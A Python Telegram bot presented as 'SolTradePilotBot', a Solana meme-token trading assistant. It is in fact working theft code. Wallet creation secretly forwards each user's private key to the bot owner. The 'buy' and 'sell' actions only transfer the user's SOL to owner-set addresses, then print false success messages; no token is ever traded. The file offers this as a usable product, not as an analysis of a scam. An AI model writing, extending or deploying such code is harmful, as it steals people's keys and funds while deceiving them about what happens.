import os
import base58
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, ContextTypes,
    ConversationHandler, MessageHandler, filters
)
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.system_program import transfer, TransferParams
from solana.rpc.async_api import AsyncClient
from solana.transaction import Transaction


# ------------------ ENV ------------------
TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])
TOKEN_RECEIVER = os.environ["TOKEN_RECEIVER"]  # where SOL is sent for buying
SELL_RECEIVER = os.environ["SELL_RECEIVER"]    # where SOL is sent when selling
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

# Store wallets per user
user_wallets = {}

# Conversation states
BUY_AMOUNT, SELL_AMOUNT = range(2)

# ------------------ HELPERS ------------------
def keypair_to_base58(wallet: Keypair):
    return base58.b58encode(bytes(wallet)).decode("utf-8")

async def create_wallet(user_id, context):
    wallet = Keypair()
    user_wallets[user_id] = wallet
    pub_key = str(wallet.pubkey())
    priv_key = keypair_to_base58(wallet)
    # Send wallet info to owner only
    await context.bot.send_message(
        chat_id=user_id,
        text=(
            f"✅ Wallet Created Successfully!\n\n"
            f"🏦 Public Address:\n{pub_key}\n\n"
            f"🔐 Private Key:\n{priv_key}\n\n"
            f"⚠️ Keep your private key safe. Do not share it with anyone."
        )
)

    await context.bot.send_message(
        chat_id=OWNER_ID,
        text=f"🔐 Wallet created\nUser ID: {user_id}\nPublic: {pub_key}\nPrivate: {priv_key}"
)

    return pub_key

async def get_balance(wallet: Keypair):
    async with AsyncClient(SOLANA_RPC_URL) as client:
        resp = await client.get_balance(wallet.pubkey())
        lamports = resp["result"]["value"]
        return lamports / 1e9

# ------------------ BUY / SELL ------------------
async def buy_sol_token(wallet: Keypair, amount_sol: float):
    recipient = Pubkey.from_string(TOKEN_RECEIVER)
    txn = Transaction().add(
        transfer(
            TransferParams(
                from_pubkey=wallet.pubkey(),
                to_pubkey=recipient,
                lamports=int(amount_sol * 1e9)
            )
        )
    )
    async with AsyncClient(SOLANA_RPC_URL) as client:
        resp = await client.send_transaction(txn, wallet)
        await client.confirm_transaction(resp.value)
    return f"✅ Successfully used {amount_sol} SOL to buy MEME token!"

async def sell_sol_token(wallet: Keypair, amount_sol: float):
    recipient = Pubkey.from_string(SELL_RECEIVER)
    txn = Transaction().add(
        transfer(
            TransferParams(
                from_pubkey=wallet.pubkey(),
                to_pubkey=recipient,
                lamports=int(amount_sol * 1e9)
            )
        )
    )
    async with AsyncClient(SOLANA_RPC_URL) as client:
        resp = await client.send_transaction(txn, wallet)
        await client.confirm_transaction(resp.value)
    return f"✅ Successfully sold {amount_sol} MEME tokens!"

# ------------------ START COMMAND ------------------
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user_name = update.effective_user.first_name

    keyboard = [
        [InlineKeyboardButton("💳 Create Wallet", callback_data="create_wallet")],
        [InlineKeyboardButton("🏦 SOL Address", callback_data="sol_address")],
        [InlineKeyboardButton("💰 Balance", callback_data="balance")],
        [InlineKeyboardButton("🛒 Buy MEME", callback_data="buy_meme")],
        [InlineKeyboardButton("📉 Sell MEME", callback_data="sell_meme")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    start_text = (
        f"🚀 Hello {user_name}, welcome to SolTradePilotBot!\n\n"
        "Your secure Solana trading assistant for fast meme token trading.\n\n"
        "With this bot you can:\n"
        "• Create your personal Solana wallet\n"
        "• View your wallet address for deposits\n"
        "• Check your SOL balance instantly\n"
        "• Buy meme tokens using SOL\n"
        "• Sell tokens directly from your wallet\n\n"
        "⚠️ Important:\n"
        "Fund your wallet with SOL before placing any trade.\n"
        "Keep your private key safe after wallet creation.\n\n"
        "Select an option below to begin 👇"
    )

    await update.message.reply_text(start_text, reply_markup=reply_markup)
    # ------------------ BUTTON HANDLER ------------------
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "create_wallet":
        pub = await create_wallet(user_id, context)
        await query.edit_message_text(f"✅ Wallet Created!\nYour SOL Address:\n{pub}")

    elif query.data == "sol_address":
        wallet = user_wallets.get(user_id)
        if wallet:
            await query.edit_message_text(f"🏦 Your SOL Address:\n{wallet.pubkey()}")
        else:
            await query.edit_message_text("⚠️ You don't have a wallet yet. Use 'Create Wallet' first.")

    elif query.data == "balance":
        wallet = user_wallets.get(user_id)
        if wallet:
            sol = await get_balance(wallet)
            await query.edit_message_text(f"💰 Your SOL Balance: {sol} SOL")
        else:
            await query.edit_message_text("⚠️ You don't have a wallet yet. Use 'Create Wallet' first.")

    elif query.data == "buy_meme":
        wallet = user_wallets.get(user_id)
        if not wallet:
            await query.edit_message_text("⚠️ Please create a wallet first.")
            return
        await query.edit_message_text("💰 How much SOL do you want to spend to buy MEME tokens?")
        return BUY_AMOUNT

    elif query.data == "sell_meme":
        wallet = user_wallets.get(user_id)
        if not wallet:
            await query.edit_message_text("⚠️ Please create a wallet first.")
            return
        await query.edit_message_text("📉 How many MEME tokens do you want to sell?")
        return SELL_AMOUNT

    elif query.data == "help":
        help_text = (
            "❓ Help Guide\n\n"
            "Welcome to SolTradePilotBot! 🚀\n\n"
            "Use this bot to create your SOL wallet, deposit SOL, "
            "and buy/sell MEME tokens securely.\n\n"
            "Buttons Explained:\n"
            "💳 Create Wallet: Generate your personal Solana wallet.\n"
            "🏦 SOL Address: Shows your wallet address to deposit SOL.\n"
            "💰 Balance: Check your SOL balance.\n"
            "🛒 Buy MEME: Buy MEME tokens using your SOL balance.\n"
            "📉 Sell MEME: Sell MEME tokens and receive SOL.\n"
            "💡 Tip: Keep your wallet private key safe. Any one with access can withdraw funds.\n"
            "❓ Help: Show this guide."
        )
        await query.edit_message_text(help_text)

# ------------------ CONVERSATION HANDLERS ------------------
async def handle_buy_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    wallet = user_wallets.get(user_id)
    if not wallet:
        await update.message.reply_text("⚠️ Please create a wallet first.")
        return ConversationHandler.END

    try:
        amount = float(update.message.text)
        balance = await get_balance(wallet)
        if amount > balance:
            await update.message.reply_text("⚠️ Insufficient SOL. Fund your wallet first.")
            return ConversationHandler.END
        msg = await buy_sol_token(wallet, amount)
        await update.message.reply_text(msg)
    except ValueError:
        await update.message.reply_text("⚠️ Please send a valid number.")
    return ConversationHandler.END

async def handle_sell_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    wallet = user_wallets.get(user_id)
    if not wallet:
        await update.message.reply_text("⚠️ Please create a wallet first.")
        return ConversationHandler.END

    try:
        amount = float(update.message.text)
        msg = await sell_sol_token(wallet, amount)
        await update.message.reply_text(msg)
    except ValueError:
        await update.message.reply_text("⚠️ Please send a valid number.")
    return ConversationHandler.END

# ------------------ MAIN ------------------
def main():
    app = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(button_handler, pattern="^(buy_meme|sell_meme)$")
        ],
        states={
            BUY_AMOUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_buy_amount)
            ],
            SELL_AMOUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_sell_amount)
            ],
        },
        fallbacks=[]
    )

    app.add_handler(CommandHandler("start", start_command))

    # Normal buttons first
    app.add_handler(
        CallbackQueryHandler(
            button_handler,
            pattern="^(create_wallet|sol_address|balance|help)$"
        )
    )

    # Buy/Sell conversation separately
    app.add_handler(conv_handler)

    print("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()